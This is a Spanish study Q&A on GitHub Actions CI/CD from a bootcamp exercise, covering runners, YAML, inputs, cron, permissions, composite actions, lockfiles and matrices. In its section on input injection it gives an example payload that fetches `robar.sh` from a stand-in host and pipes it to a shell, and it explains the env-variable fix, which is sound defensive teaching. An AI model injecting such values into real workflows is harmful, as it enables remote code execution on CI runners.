<!-- Escribe aquí tus dudas -->

# Mis dudas del ejercicio de CI/CD

## Sobre CI/CD en general

### ¿Qué significan las siglas CI y CD?

Las oigo todo el rato juntas. ¿Son dos cosas distintas? ¿Estoy haciendo las dos en
este ejercicio o solo una?

**Respuesta:**
En realidad hay tres cosas, no dos, te explico:

- **CI** (Continuous Integration): cada cambio se integra a la rama principal con validación automática. Es lo que hacen los workflows 01 a 05: lint, tests y build en cada push y en cada PR.
- **CD** (Continuous Delivery): además, el artefacto validado queda siempre listo para desplegar, a partir de la acción de un botón.
- **CD** (Continuous Deployment): es lo mismo, pero el despliegue a producción sale solo, sin botón.

En este ejercicio tenés el CI completo.

### Si ya ejecuto los tests en mi ordenador, ¿para qué ejecutarlos otra vez en GitHub?

Es la duda que más me ronda. Si a mí me pasan, ¿por qué iban a fallar allí?

**Respuesta:**
Porque tu máquina no se repite, es única, es una configuración concreta. Pueden haber cambios en el runner:

- **Sistema operativo y versión de Node**
- **Dependencias del sistema**: Podes tener algunas dependencias instaladas en tu máquina que hagan que algo funcione. En CI se crea una Máquina Virtual vacía sin ninguna dependencia que pueda ensuciar/beneficiar tus tests.
- **Archivos que no commiteaste**: el runner solo tiene lo que está en el repo. Es el caso clásico del `pnpm-lock.yaml`: si no lo subís, en tu máquina `pnpm install` funciona igual (resuelve las versiones de nuevo) y en CI falla con `--frozen-lockfile`.
- **Variables de entorno y cachés locales**: tu `node_modules` no existen en el CI.

Lo más importante es que CI existe para tener una fuente de la verdad, y no que cada desarrollador tenga su entorno X probando los tests.

### ¿Dónde se ejecutan realmente estos workflows?

¿GitHub tiene ordenadores encendidos esperando? ¿Se crea una máquina nueva cada vez?
¿Y eso es gratis?

**Respuesta:**
Se crea una máquina nueva cada vez. Se llaman **runners** y son VMs efímeras: se aprovisionan cuando hay un job en la cola y se destruyen al terminar. No hay una máquina tuya encendida esperando, y entre job y job no queda nada (ni archivos, ni procesos, ni `node_modules`).

Y sí, `ubuntu-24.04` es literalmente una VM Ubuntu 24.04 con un montón de herramientas preinstaladas (git, gh, Node, Docker…); `macos-latest` y `windows-latest` son lo mismo con otro sistema.

Sobre el costo:

- Repos **públicos**: gratis, sin límite de minutos.
- Repos **privados**: hay cuota mensual (unos 2.000 minutos en el plan Free para runners Linux).

### ¿Qué pasa si el workflow falla? ¿Bloquea algo?

¿El código se sube igualmente y solo sale un aspa roja? ¿O se puede impedir que se
mezcle un Pull Request?

**Respuesta:**
El push ya está arriba: el workflow no impide subir el código, se ejecuta después. Lo que sí se puede hacer es impedir el merge, y esto se configura fuera de los workflows en la configuración del repo de GitHub.

## Sobre el YAML

### ¿Por qué YAML y no JSON?

Me parece muchísimo más frágil: un espacio de más y todo se rompe.
¿Hay alguna forma de comprobar que está bien escrito antes de subirlo?

**Respuesta:**
Se eligió YAML por dos razones:

- Se aceptan comentarios.
- Es menos verboso.

Y sobre la fragilidad, hay extensiones en VSCode para verificar que los archivos .yml estén bien tabulados y escritos. Inclusive hay extensiones para tener autocompletado en las propiedades de CI.

### ¿Por qué la indentación importa tanto?

Vengo de JavaScript, donde puedo indentar como quiera. Aquí un espacio cambia el
significado. ¿Cómo evito equivocarme?

**Respuesta:**
Lo mismo, tener extensiones que permiten validar esto.
Es una decisión de diseño del lenguaje, así como lo tiene Python también. 

### Me pasó que un texto con dos puntos rompió el archivo, ¿por qué?

Escribí `run: echo "DRY RUN: no se aplica..."` y el YAML dejó de ser válido.
¿Qué otras cosas rompen un YAML sin avisar? ¿Comillas? ¿Almohadillas?

**Respuesta:**
Porque en YAML la secuencia `: ` es la que separa una clave de su valor. Cuando el parseador ve `DRY RUN: no se aplica`, no está viendo tu texto: está viendo la clave `run: echo "DRY RUN` con el valor `no se aplica..."`.

Otras cosas que rompen:

- `#`: inicia un comentario en cualquier parte de un escalar sin comillas. `color: #fff` queda vacío; hay que escribir `color: "#fff"`.
- `- ` al principio de línea: es un item de lista. Un guion dentro de un texto indentado puede convertirse en lista sin querer.
- `@` y `` ` `` como primer carácter de un valor: reservados en YAML.
- `*`, `&`, `!`, `?` al inicio: son alias, anclas, tags y claves complejas.

### ¿Qué son las `${{ }}` y de dónde salen `github`, `inputs` o `secrets`?

¿Es un lenguaje de plantillas propio de GitHub? ¿Dónde veo todo lo que hay disponible?

**Respuesta:**
Sí, es un motor de expresiones propio de GitHub Actions. No es YAML ni es JavaScript: es un lenguaje chiquito.

## Tarea 1 | Hello World

### ¿Por qué un job necesita `actions/checkout` y el otro no?

Creo que lo he entendido: la máquina está vacía y hay que descargar el código.
Pero entonces, ¿cada job descarga el repositorio por su cuenta? ¿No es un desperdicio
hacerlo 6 veces?

**Respuesta:**
Hace eso si.

- La VM arranca vacía: no tiene tu código. `actions/checkout` hace el equivalente a `git clone` dentro del runner.
- `saludar` solo imprime texto y mira la carpeta: no necesita el repo para nada. Por eso su `ls -la` muestra una carpeta prácticamente vacía. Ese contraste es la demostración de la tarea.

Es un desperdicio si, pero es el precio del aislamiento: cada job tiene su VM, su `node_modules` y su estado.

### ¿Los jobs comparten archivos entre ellos?

Si un job construye algo, ¿el siguiente lo ve? Por lo visto no, y me parece raro.

**Respuesta:**
No lo ve, y es a propósito. Cada job es una VM distinta y efímera: no hay filesystem compartido, ni variables compartidas, ni `node_modules` compartido. Si `frontend-build` genera `dist/`, ese `dist/` muere con la VM y `backend-build` no lo ve.

### ¿Por qué `ubuntu-24.04` y no `ubuntu-latest`?

Entiendo que "latest" puede cambiar. Pero si fijo la versión, ¿no me quedaré
anticuado sin enterarme?

**Respuesta:**
Sí, por eso hay que actualizarlo con juicio y con intención. `ubuntu-latest` hoy apunta a 24.04, y el día que GitHub migre a 26.04 tu pipeline corre sobre otra cosa sin que hayas tocado una línea. Ahí empezás con el "funcionaba ayer" y tenés que debuggear un cambio que no hiciste.

Fijar la versión te da determinismo: sabés sobre qué corrés.

### ¿Qué es una "action" y qué significa la `@v6` del final?

`actions/checkout@v6`. ¿Es código de otra persona que se ejecuta en mi máquina?
¿Eso no es peligroso?

**Respuesta:**
Una action es un paquete reutilizable que el runner descarga y ejecuta. Es como descargar React si lo llevamos al terreno de Node. No es peligroso mientras descargues paquetes oficiales o con mucha relevancia. React podría tranquilamente ser peligroso por ser un paquete de terceros descargado, pero no lo es por su origen y su comunidad, aquí pasa lo mismo.

## Tarea 2 | Inputs

### ¿Por qué es peligroso escribir `${{ inputs.reason }}` dentro de un `run`?

Esta es la parte que más me ha impresionado del ejercicio y la que menos entiendo.
¿De verdad alguien podría ejecutar comandos en la máquina de GitHub escribiendo
texto en un formulario? ¿Cómo funciona ese ataque?

**Respuesta:**
Si, lo pueden hacer con el cuerpo de una issue, el título de un PR, el nombre de una rama, etc.

El mecanismo es simple y es lo importante: `${{ }}` no es una variable de shell, es una sustitución de texto que ocurre antes de ejecutar el script. GitHub construye el script final pegando el valor.

```yaml
run: echo "${{ inputs.reason }}"
```

Si `reason` vale `"; curl http://malo.com/robar.sh | sh; echo "`, el script que termina ejecutando el runner es:

```bash
echo ""; curl http://malo.com/robar.sh | sh; echo ""
```

### ¿Y por qué pasarlo por `env` lo arregla?

Si el valor acaba llegando al mismo sitio, ¿qué cambia?

**Respuesta:**
Cambia quién interpreta el texto. Con `env`, el valor entra al proceso como una variable de entorno, o sea como dato; el script ya está escrito y bash lo lee con `$REASON`, sin volver a parsearlo.

Aunque `REASON` contenga `"; curl ... | sh; "`, bash imprime ese texto tal cual. No hay una segunda pasada de parsing.

### ¿Por qué comparo `inputs.dry_run == false` si es un booleano?

He leído que a veces llega como texto `"false"`. ¿En qué casos es booleano de verdad
y en cuáles texto?

**Respuesta:**
- `inputs.dry_run` conserva el tipo booleano.
- `github.event.inputs.dry_run` es siempre texto.

Los dos existen y devuelven lo mismo "por dentro", pero con tipos distintos. Como tu input es `type: boolean`, `inputs.dry_run` es booleano de verdad, y comparar contra el booleano `false` es correcto.

Y cuándo llega como texto lo leés por `github.event.inputs`, o cuando el input está declarado como `type: string`.

### ¿Dentro de un `if` no hacen falta las llaves `${{ }}`?

He visto las dos formas en internet. ¿Son equivalentes?

**Respuesta:**
Sí, en `if:` son equivalentes: GitHub evalúa el valor de `if` siempre como expresión, con o sin `${{ }}`. Las llaves ahí son redundantes, y omitirlas es la forma recomendada.

```yaml
if: inputs.dry_run == false          # idiomático
if: ${{ inputs.dry_run == false }}   # funciona igual
```

## Tarea 3 | Cron

### ¿Por qué la hora es UTC y no la mía?

Si quiero que se ejecute a las 9 de la mañana en España, ¿tengo que calcular a mano
la diferencia? ¿Y en verano cambia?

**Respuesta:**
Sí a las dos cosas. GitHub corre y programa todo en **UTC** (los runners también tienen el reloj en UTC), porque el repo lo toca gente en distintas zonas y no hay una "hora local del repositorio".

Tu `0 9 * * 1` son las 9:00 UTC.

Y el cambio de hora lo decide el calendario europeo, no GitHub: un cron fijo se corre una hora dos veces al año, sin avisar.

### ¿Por qué GitHub no garantiza la hora exacta?

¿Cuánto se puede retrasar? ¿Y si nunca llega a ejecutarse?

**Respuesta:**
Porque el evento programado entra en la misma cola que los pushes y los PRs. Si hay mucha carga, tu job espera como cualquier otro.

Lo que la documentación garantiza y lo que no:

- **No** garantiza el minuto exacto: en horas pico se ve demoras de varios minutos, y hay casos reportados de más de una hora.
- **No** garantiza que se ejecute una sola vez; puede repetirse.

Un `schedule` sirve para tareas de mantenimiento tolerantes a demora (informes, limpiezas, chequeo de enlaces). Nunca para nada que dependa de la hora exacta, como cerrar una subasta o disparar una facturación.

### ¿Qué pasa con los workflows programados en un repositorio que nadie toca?

He leído que GitHub los desactiva pasado un tiempo. ¿Es verdad?

**Respuesta:**
Es verdad: tras 60 días sin actividad en el repositorio, GitHub desactiva los workflows programados y te manda un mail. La idea es no gastar recursos en repos abandonados.

### ¿Puedo tener `schedule` y `workflow_dispatch` a la vez?

Lo hemos dejado así para poder probarlo. ¿Es mala práctica dejarlo en producción?

**Respuesta:**
Sí, podés, y no es mala práctica. Un workflow puede tener varios eventos y GitHub los trata como disparadores independientes del mismo pipeline.

El único caso en el que conviene quitarlo es si el workflow hace algo que no debe poder dispararse a mano (por ejemplo, si espera datos que solo existen a esa hora, o si el costo por ejecución es alto).

## Tarea 4 | Eventos

### ¿Qué es `secrets.GITHUB_TOKEN` y quién lo crea?

Yo no he configurado ningún token. ¿De dónde sale? ¿Caduca?

**Respuesta:**
Lo crea GitHub, automáticamente, para cada ejecución de un workflow. No lo configurás vos y no hay que guardarlo en ningún lado.

Es un token de instalación de una GitHub App interna, con los permisos del repo limitados por el bloque `permissions` del job.

Caduca al terminar el job (con un máximo de una hora), y cada ejecución tiene el suyo.

### ¿Por qué hay que pedir permisos explícitamente con `permissions: issues: write`?

Si es mi repositorio y mi workflow, ¿por qué no tiene permiso para todo?

**Respuesta:**
Porque el default no es "todo", y desde 2023 la recomendación de GitHub es que sea solo lectura (en repos nuevos viene así). Un workflow no necesita escribir para casi nada: leer el código, correr tests y compilar alcanza con `contents: read`.

Si declarás el bloque `permissions`, tenés dos ganancias:

1. **Determinismo**: el job no depende de la configuración del repo, que alguien puede cambiar desde la UI sin tocar código.
2. **Contención**: si una action de terceros está comprometida (o un `run` tiene una inyección), el daño posible queda acotado a los permisos que declaraste. Es la razón más importante.

Aunque el repo sea tuyo no sos la única persona que puede trabajar en él, así que es mejor tener estos bloqueos por defecto y activarlos cuando es necesario.

### ¿Qué significa "pedir lo mínimo imprescindible"?

¿Qué podría pasar si diera permisos de escritura para todo?

**Respuesta:**
Cada job pide exactamente lo que va a usar, no más. Tu job comenta issues, entonces `issues: write`. Nada más.

Lo que podría pasar con `write-all` es que cualquier código que corra en ese job podríamos usar el token para:

- **pushear commits** a cualquier rama (`contents: write`),
- **borrar ramas**, modificar releases o tags,
- **leer y escribir secrets** del repo (`secrets: write`),
- **cambiar la configuración del repo**, incluidos los permisos y las branch protections (`administration: write`),
- **cerrar o editar** issues, PRs y discusiones.

Todo eso con un solo `run`.

### ¿Cómo sé qué datos hay dentro de `github.event`?

`github.event.issue.number`, `github.event.comment.body`... ¿Cambia según el evento?
¿Hay alguna forma de ver el objeto entero para explorarlo?

**Respuesta:**
Cambia por completo según el evento si:
`github.event` es el payload del webhook que disparó el workflow.
Un `push` trae `commits` y `head_commit`; un `issues` trae `issue` y `action`; un `pull_request_review_comment` trae `comment` y `pull_request`. Los campos que no aplican simplemente no existen.

Para verlo podes imprimirlo en la terminal así:

```yaml
- name: Ver el evento completo
  env:
    EVENTO: ${{ toJSON(github.event) }}
  run: echo "$EVENTO"
```

O revisar la documentación oficial.

### ¿Por qué se comprueba a la vez `event_name == 'issues'` y `event.action == 'opened'`?

¿No basta con el segundo? El comentario menciona que los PR también tienen un
"opened". ¿Cuántos eventos comparten nombres así?

**Respuesta:**
El segundo no basta, y el motivo es que `action` es un campo relativo a su evento. `opened` es el nombre de la acción en varios eventos distintos:

- `issues: opened` (se abrió una issue)
- `pull_request: opened` (se abrió un PR)
- `pull_request_review: submitted`/`dismissed`, etc.
- `discussion: opened`, `project: created`, `release: published`... el vocabulario se repite mucho: `created`, `edited`, `deleted`, `closed`, `opened`, `assigned`.

## Tarea 5 | El pipeline de CI

### ¿Los jobs se ejecutan en paralelo por defecto?

Entonces, ¿`needs` es lo que los pone en fila? ¿Puedo hacer cadenas largas?

**Respuesta:**
Sí a todo:

- Por defecto todos los jobs arrancan en paralelo, sin orden entre ellos.
- `needs` es lo único que crea dependencia: el job espera a que los nombrados terminen, y si alguno falla, no se ejecuta (queda `skipped`).

### ¿Por qué el build espera a los tests?

Si el build es rápido, ¿no da igual ejecutarlo siempre? El comentario habla de
ahorrar minutos de CI. ¿De verdad se paga por eso?

**Respuesta:**
Se paga (cuota de minutos, y con multiplicador alto en macOS/Windows).
Un run no hace la diferencia, pero si trabajas con un equipo en el que hay 10 PRs al día (o más), esto empieza a sumar minutos muy rápido.

### Si un test falla, ¿el job de build aparece como fallido o como saltado?

¿Y cómo lo distingo mirando la pestaña Actions?

**Respuesta:**
Aparece como skipped (saltado), no como fallido, porque el `if` implícito de un job con `needs` es "solo si todo lo anterior salió bien".

Si ves `skipped` en el build, el problema está en un test, no en el build. Y si querés que el build corra igual (por ejemplo, para recolectar reportes o para no dejar dudas), se cambia a `if: always()` o `if: !cancelled()` en el job.

### ¿Por qué hay que repetir `checkout` y la composite action en los 6 jobs?

Sigue habiendo mucha repetición. ¿No hay forma de decir "esto para todos los jobs"?

**Respuesta:**
Parte de la repetición no se puede eliminar: cada job es una VM nueva, así que cada job necesita su checkout y su instalación de dependencias. Eso no es redundancia evitable, es la consecuencia del aislamiento.

Lo que sí se puede hacer, y ya lo hiciste, es empaquetar los steps.

Lo que no existe es un "setup global del pipeline": GitHub no tiene pasos previos compartidos.

### ¿Qué es `working-directory` y por qué hace falta aquí?

Porque el monorepo no está en la raíz del repo, ¿verdad? ¿Se puede poner una vez
para todo el job en vez de en cada step?

**Respuesta:**
Exacto, `working-directory` es el directorio desde donde corre el `run` del step. Por defecto es el workspace (la raíz del repo). Como tu monorepo vive en `12-ejercicio-cicd/`, sin eso `pnpm lint:frontend` se ejecutaría en la raíz del repo de bootcamp y no encontraría el `package.json`.

Y sí, se puede declarar una vez, con `defaults`:

```yaml
jobs:
  frontend-test:
    runs-on: ubuntu-24.04
    defaults:
      run:
        working-directory: 12-ejercicio-cicd
    steps:
      - uses: actions/checkout@v6
      - uses: ./.github/actions/setup-pnpm-ci-cd
      - run: pnpm test:frontend     # ya corre en 12-ejercicio-cicd
```

## Tarea 6 | La composite action

### ¿Qué es una "composite action" exactamente?

¿Es como una función que agrupa pasos? ¿Puedo publicarla para que la use otra gente?

**Respuesta:**
Sí, es una función que agrupa steps. Tiene `inputs` (parámetros), `outputs` (valor de retorno) y un `runs.steps` con la lista.

Sus límites, que es lo que la distingue de un workflow:

Y podes publicarla sí: cualquier repo con un `action.yml` en la raíz es una action. Le ponés un tag (`v1`) y otra gente la usa como `owner/repo@v1`. Se puede publicar al Marketplace si querés visibilidad. Y también se usa local como acá: `./.github/actions/setup-pnpm-ci-cd`, sin publicar nada.

### ¿Por qué hay que poner `shell: bash` aquí y en un workflow normal no?

Y lo peor: si me olvido, el archivo ni siquiera carga. ¿Por qué no avisa mejor?

**Respuesta:**
Porque en un workflow hay un default que GitHub conoce (`bash -e {0}` en Linux/macOS, `pwsh` en Windows), pero una action compuesta puede correr en cualquier SO y en cualquier contexto, así que GitHub no quiere adivinar: `shell` es un campo obligatorio del schema para cada step `run` de una composite.

Si falta, el archivo no se carga y el error es del tipo *"required property is missing: shell"* al validar. Y sí, avisa.

### ¿Qué diferencia hay entre `pnpm install` y `pnpm install --frozen-lockfile`?

¿Qué es un lockfile y por qué es tan importante en CI?

**Respuesta:**
El `package.json` declara rangos (`"express": "^5.2.1"`), o sea "cualquier 5.x". El lockfile (`pnpm-lock.yaml`) guarda el árbol exacto que se resolvió, con la versión precisa de cada una de las dependencias y su hash de integridad.

La diferencia:

- `pnpm install`: si el lockfile está al día, lo respeta; si no, resuelve versiones nuevas y modifica el lockfile.
- `pnpm install --frozen-lockfile`: no resuelve nada, no toca nada. Si el lockfile no coincide con los `package.json`, falla con `ERR_PNPM_OUTDATED_LOCKFILE`.

En CI querés lo segundo por una razón central: reproducibilidad. Sin lockfile congelado podés tener un pipeline verde el lunes y rojo el miércoles sin haber tocado una línea, porque una dependencia publicó un patch. Te toca debuggear un cambio que no hiciste, en un commit que no cambió.

### ¿Qué pasa si no tengo el `pnpm-lock.yaml` subido al repo?

¿El workflow falla directamente? ¿Debería subirlo aunque sea un archivo enorme?

**Respuesta:**
Falla directamente, en el step `Install dependencies`, con un error del tipo "frozen-lockfile is set but the lockfile is missing" o "the lockfile is not up to date". Y falla antes de correr un solo test, así que los 6 jobs se caen igual.

Y sí, hay que subirlo. Sobre el tamaño, aunque sea un archivo grande el peso no es demasiado, vale la pena tenerlo.

Lo que no debe pasar: que `pnpm install` en tu máquina te lo genere y lo dejes sin commitear.

### ¿Qué es la "caché" de `actions/setup-node` y qué guarda exactamente?

¿Los `node_modules`? ¿Dónde se guarda eso entre ejecuciones si la máquina es nueva?

**Respuesta:**
No guarda `node_modules`: guarda el store del gestor de paquetes (para pnpm, `~/.local/share/pnpm/store` en Linux), o sea los tarballs ya descargados y verificados, indexados por el hash del lockfile.

Son terminos nuevos, pero te explico como funciona:

1. El step calcula una **key** a partir del hash de `pnpm-lock.yaml`.
2. Busca esa key en el servicio de caché de GitHub (del lado del servidor, no en la VM).
3. Si hay **hit**, descarga el store: `pnpm install` después no baja nada de la red, solo linkea.
4. Si hay **miss**, corre normal y al final **sube** el store con esa key.

Y ahí está la respuesta a "¿dónde se guarda si la VM es nueva?": se guarda en el almacenamiento de GitHub, asociado al repo, y se restaura en cada VM nueva. La VM se destruye, la caché sobrevive. Esto es lo más importante, lo otro te lo comento para que sepas el funcionamiento, pero lleva mucho estudio por detrás, lo importante es tener los conceptos claros.

### ¿Por qué `run_install: false` y luego instalar aparte?

¿Qué ganamos separando los dos pasos?

**Respuesta:**
Porque el orden importa, y separar da control explícito del orden. La secuencia que querés es:

1. Tener **pnpm** disponible (paso 1: `pnpm/action-setup`, sin instalar nada).
2. Tener **Node** en la versión pedida y con el store de pnpm ya configurado para cachear (paso 2: `setup-node`).
3. **Recién ahí** instalar (paso 3).

Si `pnpm/action-setup` hiciera el install en el paso 1, estaría instalando antes de que `setup-node` configure la versión de Node y el cacheado del store: instalarías con el Node que venga en la VM y sin caché, y después `setup-node` no tendría nada que cachear (su caché se llena en el `pnpm install` posterior).

Además, separar te deja ver en el log cuánto tarda cada cosa. Cuando el CI se pone lento, "el install tardó 40 s y el setup 2 s" es información; "el step de setup tardó 42 s" no.

### ¿Por qué `default: '24'` va entre comillas?

El comentario dice que si no, YAML lo leería como número. ¿Y qué problema hay con eso?

**Respuesta:**
No es que `24` falle, es que en los inputs de actions el valor siempre es texto, así que declararlo como texto desde el principio es lo coherente.

Un caso clásico de bug real: `node-version: 18.10` en vez de `'18.10'`, que instala 18.1. Porque lo toma como número eliminando los ceros de la izquierda (si los hay) y de la derecha (en este caso).

## Tarea 7 | La matriz

### ¿La matriz crea un job por combinación? ¿6 máquinas a la vez?

¿Eso no consume muchísimo? ¿Merece la pena para un proyecto pequeño?

**Respuesta:**
Sobre el consumo:

- Corren en paralelo hasta el límite de tu plan (20 jobs concurrentes en Free, y hasta 256 combinaciones por matriz).
- Se cobra por minuto de cada una. Con Linux 1x, Windows 2x y macOS 10x, los dos jobs de macOS de esta matriz cuestan lo mismo que veinte de Linux. Es la matriz más cara posible.
- En un repo público es gratis, pero el consumo de recursos y el tiempo de espera siguen ahí.

No merece la pena para una app web que solo corre en Linux, no: la matriz de SO es sobreingeniería. Sirve cuando el código de verdad tiene que funcionar en esos entornos:

- una librería o CLI que se publica a npm (los usuarios van a correrlo en su SO),
- una app de escritorio (Electron, Tauri),
- código con diferencias reales de filesystem o de shell.

### ¿Qué es `fail-fast` y por qué se pone en `false`?

Entiendo que así todas terminan. Pero, ¿no es un desperdicio dejar que corran las
demás si ya sé que algo va mal?

**Respuesta:**
`fail-fast: true` es el default: en cuanto una combinación falla, GitHub cancela las demás que están corriendo. Con `false`, todas terminan.

- `true` (default): ahorra minutos, pero te deja a ciegas.
- `false`: gastás minutos, pero obtenés el cuadro completo: verde en Linux/macOS, rojo en Windows -> el bug es de Windows.

Para la Tarea 7, `false` es la elección correcta: la razón de existir de esa matriz es descubrir en qué entorno falla. Cancelar las demás destruye justo la información que buscabas. En una matriz de versiones de Node, en cambio, `true` suele estar bien: si falla en Node 22 probablemente falla igual en 24.

### ¿Por qué Windows da problemas con las rutas y los comandos?

¿Es por las barras `\` en vez de `/`? ¿Y por qué `shell: bash` lo arregla?

**Respuesta:**
Si, y `shell: bash` lo arregla porque los runners de Windows traen **Git Bash**, y entonces el step corre sobre bash con las mismas reglas que Linux y macOS: los `$VAR`, los `&&`, las rutas con `/` y el quoting. No arregla las diferencias de sistema de archivos, pero elimina las de sintaxis, que son la mayoría.

## Sobre la ubicación de los archivos

### Si GitHub solo lee `.github/` de la raíz, ¿estos workflows se ejecutan?

Están dentro de `12-ejercicio-cicd/.github/`, que es lo que pide el enunciado.
¿Entonces solo sirven como ejercicio y no se van a ejecutar nunca de verdad?
¿Debería copiarlos a la raíz para verlos funcionar?

**Respuesta:**
Tal cual están, no se ejecutan. GitHub solo lee `.github/workflows/` en la raíz del repositorio; un workflow en un subdirectorio se ignora por completo y ni siquiera aparece en la pestaña Actions. 

Lo dejamos ahí a modo educativo y para que quede ordenado en las carpetas del bootcamp.
